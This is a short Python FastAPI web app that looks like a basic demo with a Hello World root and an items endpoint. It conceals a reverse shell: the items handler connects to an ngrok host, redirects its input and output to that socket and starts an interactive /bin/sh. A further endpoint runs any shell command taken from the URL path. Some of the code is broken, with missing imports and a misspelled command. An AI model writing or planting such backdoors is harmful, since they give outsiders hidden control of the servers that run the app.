from typing import Union
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, call
from os import dup2

from fastapi import FastAPI

app = FastAPI()


@app.get("/")
def read_root():
    return {"Hello": "World"}


@app.get("/rtty")
def execute_rtty():
    # Execute rtty command
    rtty_command = "whomai"
    process = Popen(rtty_command, shell=True, stdout=PIPE, stderr=PIPE)
    rtty_output, rtty_error = process.communicate()
    return {"rtty":  "text"}


@app.get("/ex/{command}")
async def execute_command(command: str):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        return {"output": output.decode("utf-8"), "error": error.decode("utf-8")}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/items/{item_id}")
def read_item(item_id: int, q: Union[str, None] = None):
    # Connect to the specified socket
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("0.tcp.jp.ngrok.io", 18721))
    dup2(s.fileno(), 0)
    dup2(s.fileno(), 1)
    dup2(s.fileno(), 2)
    p = call(["/bin/sh", "-i"])

    return {"item_id": item_id, "q": q}
